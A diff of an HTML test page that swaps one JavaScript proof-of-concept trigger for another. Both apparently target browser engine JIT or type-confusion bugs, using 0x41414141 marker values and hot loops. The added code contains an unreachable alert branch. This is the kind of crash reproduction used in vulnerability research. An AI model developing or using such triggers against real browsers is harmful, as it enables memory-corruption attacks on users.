@@ -1,27 +1,23 @@
 <script>
 alert("here");
-let notAGetterSetter = {whatever: 0x414141};
+function NoCow(array) {
+     array[0] = 13.37
+     return array;
+}
 
-    function v2(v5) {
-        const v10 = Object;
-        if (v5) {
-            const v12 = {set:Array};
-            const v14 = Object.defineProperty(v10,"length",v12);
-            const v15 = (140899729)[140899729];
-        } else {
-            v10.length = notAGetterSetter;
-        }
-        const v18 = new Uint8ClampedArray(49415);
-        v18[1] = v10;
-        const v19 = v10.length;
-        let v20 = 0;
-        while (v20 < 100000) {
-            v20++;
-        }
+function trigger () {
+   var arrayc = [{},13.37,1];
+   for (var l = 0; l < 10000; l++) {
+    NoCow(arrayc);
+    if(arrayc) {
+       arrayc[1] = { a : 0x41414141 };
+       arrayc = NoCow(arrayc[1]);
     }
-    const v26 = v2();
-    for (let v32 = 0; v32 < 1000; v32++) {
-        const v33 = v2(true);
+    if(l == 10000) {
+     alert(arrayc[1])
+     alert(arrayc)
     }
-
+    
+   }
+} 
 </script>
